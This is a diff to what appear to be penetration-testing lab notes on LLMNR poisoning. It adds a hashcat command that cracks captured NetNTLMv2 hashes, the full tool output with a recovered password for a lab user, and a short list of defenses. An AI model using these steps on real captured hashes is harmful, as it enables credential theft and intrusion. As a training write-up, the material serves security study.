@@ -122,8 +122,81 @@ $ hashcat --help | grep SHA
   17500 | SHA3-384                                         | Raw Hash
   17600 | SHA3-512                                         | Raw Hash
 ```
+### OUTPUT:
+```
+hashcat -m 5600 hashes.txt passwords.txt --force
+hashcat (v6.1.1) starting...
 
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=============================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, 6337/6401 MB (2048 MB allocatable), 1MCU
 
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 3 digests; 3 unique digests, 3 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+INFO: Removed 1 hash found in potfile.
+
+Host memory required for this attack: 64 MB
+
+Dictionary cache hit:
+* Filename..: passwords.txt
+* Passwords.: 5
+* Bytes.....: 41
+* Keyspace..: 5
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.  
+
+PPARKER::MARVEL:abd8996fdc62d49e:7d7620fa7e88954ec8421d26f071f9ee:010100000000000052fde297a177d701a7ef1960cf99e37700000000020008003100340035004d0001001e00570049004e002d0037004d004d005900380038004400490051004700580004003400570049004e002d0037004d004d00590038003800440049005100470058002e003100340035004d002e004c004f00430041004c00030014003100340035004d002e004c004f00430041004c00050014003100340035004d002e004c004f00430041004c0008003000300000000000000000000000003000006fbf0641ae8081eadf6d920dadef058df615773394bc78a6a5676b0f47fb4a510a00100000000000000000000000000000000000090040005200500043002f00570049004e002d0037004d004d00590038003800440049005100470058002e004d0041005200560045004c002e006c006f00630061006c000000000000000000:Password2
+                                                 
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Name........: NetNTLMv2
+Hash.Target......: hashes.txt
+Time.Started.....: Tue Jul 13 12:37:01 2021, (0 secs)
+Time.Estimated...: Tue Jul 13 12:37:01 2021, (0 secs)
+Guess.Base.......: File (passwords.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    14475 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 2/3 (66.67%) Digests, 2/3 (66.67%) Salts
+Progress.........: 15/15 (100.00%)
+Rejected.........: 0/15 (0.00%)
+Restore.Point....: 5/5 (100.00%)
+Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: Password1 -> 
+
+Started: Tue Jul 13 12:37:00 2021
+Stopped: Tue Jul 13 12:37:03 2021
+
+```
+### OF NOTE:
+at the end of the hash it now shows the users actual password. 
+```
+PPARKER::MARVEL:abd8996fdc62d49e:7d7620fa7e88954ec8421d26f071f9ee:010100000000000052fde297a177d701a7ef1960cf99e37700000000020008003100340035004d0001001e00570049004e002d0037004d004d005900380038004400490051004700580004003400570049004e002d0037004d004d00590038003800440049005100470058002e003100340035004d002e004c004f00430041004c00030014003100340035004d002e004c004f00430041004c00050014003100340035004d002e004c004f00430041004c0008003000300000000000000000000000003000006fbf0641ae8081eadf6d920dadef058df615773394bc78a6a5676b0f47fb4a510a00100000000000000000000000000000000000090040005200500043002f00570049004e002d0037004d004d00590038003800440049005100470058002e004d0041005200560045004c002e006c006f00630061006c000000000000000000:Password2 
+```
 ##### LLMNR Poisoning Defense:
 1. Disable LLMNR
 2. Disable NBT-NS
